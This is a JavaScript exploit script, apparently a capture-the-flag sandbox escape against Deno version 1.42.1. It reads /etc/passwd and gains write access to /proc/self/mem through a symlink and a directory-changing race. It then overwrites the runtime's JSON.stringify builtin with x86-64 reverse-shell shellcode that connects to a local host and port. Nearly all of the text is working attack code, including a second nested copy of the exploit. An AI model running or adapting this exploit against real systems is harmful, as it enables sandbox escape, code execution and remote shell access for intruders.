(async () => {

console.log("aaaa")

const ip_addr = "127.0.0.1"
const port    = "1337"

function get_shellcode() {
    let ip_addr_hex = ip_addr.split('.').map(part => String.fromCharCode(parseInt(part, 10))).join('');
    let port_hex = String.fromCharCode((port >> 8) & 0xFF, port & 0xFF);

    // shellcode for a reverse shell connecting to ip_addr:port
    let shellcode =
      "\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x4D\x31\xC0\x6A\x02\x5F\x6A\x01\x5E\x6A\x06\x5A\x6A\x29\x58\x0F\x05" +
      "\x49\x89\xC0\x48\x31\xF6\x4D\x31\xD2\x41\x52\xC6\x04\x24\x02\x66\xC7\x44\x24\x02" + port_hex + "\xC7\x44\x24\x04" + ip_addr_hex +
      "\x48\x89\xE6\x6A\x10\x5A\x41\x50\x5F\x6A\x2A\x58\x0F\x05\x48\x31\xF6\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6" +
      "\x48\x31\xFF\x57\x57\x5E\x5A\x48\xBF\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEF\x08\x57\x54\x5F\x6A\x3B\x58\x0F\x05";

    shellcode = "\x90".repeat(1000000) + shellcode

    let shellcode_arr = new Uint8Array(shellcode.length);

    for (let i = 0; i < shellcode.length; i++) {
      shellcode_arr[i] = shellcode.charCodeAt(i);
    }

    return shellcode_arr;
}


try{

//const desc1 = { name: "run", path: "/readflag" } as const;
//const desc1 = { name: "run" } as const;
//const status1 = await Deno.permissions.request(desc1);

console.log(Deno.args)
console.log("evil time!")
console.log(await Deno.readTextFile('/etc/passwd'));
Deno.env.set("DENO_DIR", "/tmp/");
Deno.env.set("DENO_INSTALL_ROOT", "/tmp/");
Deno.env.set("DEBUG", "*");
Deno.env.set("DENO_DEBUG", "*");
Deno.env.set("PATH", "/tmp/");
//Deno.env.set("DENO_NO_PROMPT", "true");

//console.log(Deno.permissions.requestSync({ name: "run" }));
Deno.chdir("/tmp")
//console.log(await Deno.readTextFile('/proc/self/fd/../maps'));
Deno.chdir("/")
await Deno.copyFile("proc/self/maps", "/tmp/maps");
await Deno.symlink("/proc/self/mem", "/tmp/mem")


//await Deno.open('/tmp/mem', { write: true, read: false });
let mem_file = await Deno.open('/tmp/mem', { write: true, read: true });
let maps = await Deno.readTextFile("/tmp/maps");
console.log(mem_file.rid)
const mem = mem_file.rid;

let line = maps.split("\n").find(l => l.includes("deno") && l.includes("r-x"));
let base = parseInt(line.split(" ")[0].split("-")[0], 16);
let addr_stringify = base + 0x128b200; // offset for version 1.42.1

console.log("[𝝺] base address deno: 0x" + (base).toString(16));
console.log("[𝝺] address of Builtins_JsonStringify: 0x" + (addr_stringify).toString(16));
await Deno.seek(mem, addr_stringify, Deno.SeekMode.Start);

// write shellcode
let shellcode_arr = get_shellcode();
await Deno.write(mem, shellcode_arr);
console.log("[𝝺] placed the shellcode successfully, pwn incoming...")
JSON.stringify("JRN");

(async () => {

Deno.chdir("/tmp");

// data for the reverse shell
const ip_addr = "127.0.0.1"
const port    = "4444"

function get_shellcode() {
    let ip_addr_hex = ip_addr.split('.').map(part => String.fromCharCode(parseInt(part, 10))).join('');
    let port_hex = String.fromCharCode((port >> 8) & 0xFF, port & 0xFF);

    // shellcode for a reverse shell connecting to ip_addr:port
    let shellcode =
      "\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x4D\x31\xC0\x6A\x02\x5F\x6A\x01\x5E\x6A\x06\x5A\x6A\x29\x58\x0F\x05" +
      "\x49\x89\xC0\x48\x31\xF6\x4D\x31\xD2\x41\x52\xC6\x04\x24\x02\x66\xC7\x44\x24\x02" + port_hex + "\xC7\x44\x24\x04" + ip_addr_hex +
      "\x48\x89\xE6\x6A\x10\x5A\x41\x50\x5F\x6A\x2A\x58\x0F\x05\x48\x31\xF6\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6" +
      "\x48\x31\xFF\x57\x57\x5E\x5A\x48\xBF\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEF\x08\x57\x54\x5F\x6A\x3B\x58\x0F\x05";

    let shellcode_arr = new Uint8Array(shellcode.length);

    for (let i = 0; i < shellcode.length; i++) {
      shellcode_arr[i] = shellcode.charCodeAt(i);
    }

    return shellcode_arr;
}

function wait_for_non_null_value(fn) {
  //let interval_time_ms = 1;
  let interval_time_ms = 89;
  return new Promise((resolve) => {
    const interval_id = setInterval(async () => {
      const result = await fn();
      if (result !== null) {
        clearInterval(interval_id);
        resolve(result);
      }
    }, interval_time_ms);
  });
}

function change_dirs(old_cwd) {
  for (let i = 0; i < 100; i++) {
    Deno.chdir(old_cwd);
    Deno.chdir(old_cwd + "/s/e/c/f/a/u/l/t/s/e/c/u/r/i/t/y");
  }
}

function rapidly_change_dirs(old_cwd) {
  let interval;

  return {
    start: () => {
      interval = setInterval(change_dirs, 0, old_cwd);
    },
    stop: () => {
      clearInterval(interval);
    },
  };	
}

async function get_proc_maps() {
  let maps = null;
  try {
    maps = await Deno.readTextFile("../../../../../../../../proc/self/maps");
  } catch {}
  return maps;
}

async function get_proc_mem(maps) {
  let mem_file = null;
  try {
    mem_file = await Deno.open("../../../../../../../../proc/self/mem", { write: true });
    return mem_file.rid;
  } catch {}
  return null;
}

async function pwn() {
  console.log("[𝝺] sploit heaping up");

  // get cwd and create a deep directory structure
  let old_cwd = Deno.cwd();
  await Deno.mkdir("s/e/c/f/a/u/l/t/s/e/c/u/r/i/t/y", { recursive: true });

  // start changing directories rapidly to confuse deno
  let start_stop_change_dirs = rapidly_change_dirs(old_cwd);
  start_stop_change_dirs.start();

  (async () => {

    // get /proc/self/maps
    console.log("[𝝺] waiting to read /proc/self/maps");
    let maps = await wait_for_non_null_value(get_proc_maps);

    // get /proc/self/mem
    console.log("[𝝺] got /proc/self/maps, waiting for fd to /proc/self/mem");
    let mem = await wait_for_non_null_value(get_proc_mem);
    console.log("[𝝺] got fd for /proc/self/mem:", mem)

    // stop changing directories rapidly
    start_stop_change_dirs.stop();

    // extract the base address of deno based on /proc/self/maps
    let line = maps.split("\n").find(l => l.includes("deno") && l.includes("r-x"));
    let base = parseInt(line.split(" ")[0].split("-")[0], 16);
    let addr_stringify = base + 0x128b200; // offset for version 1.42.1

    console.log("[𝝺] base address deno: 0x" + (base).toString(16));
    console.log("[𝝺] address of Builtins_JsonStringify: 0x" + (addr_stringify).toString(16));
    await Deno.seek(mem, addr_stringify, Deno.SeekMode.Start);

    // write shellcode
    let shellcode_arr = get_shellcode();
    await Deno.write(mem, shellcode_arr);
    console.log("[𝝺] placed the shellcode successfully, pwn incoming...")
    JSON.stringify("JRN");

  })();
}

pwn()

})();

}catch(e){
console.log(e)
}
})();
